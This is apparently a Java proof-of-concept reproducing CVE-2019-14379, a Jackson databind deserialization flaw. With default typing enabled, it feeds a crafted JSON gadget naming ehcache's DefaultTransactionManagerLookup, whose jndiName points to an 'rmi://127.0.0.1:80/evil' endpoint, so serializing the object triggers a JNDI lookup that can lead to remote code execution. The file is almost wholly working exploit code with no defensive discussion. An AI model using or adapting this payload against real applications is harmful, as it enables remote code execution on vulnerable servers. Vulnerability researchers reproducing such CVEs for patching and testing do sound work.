package com.dem0.cve;

import com.fasterxml.jackson.databind.ObjectMapper;
import net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup;
import java.io.IOException;

public class CVE_2019_14379 {
    //jndi
    public static void main(String[] args) throws IOException {
        String json = "[\"net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup\",{\"properties\":{\"jndiName\":\"rmi://127.0.0.1:80/evil\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        Object o = mapper.readValue(json, Object.class);
        mapper.writeValueAsString(o);//调用get方法
    }
}
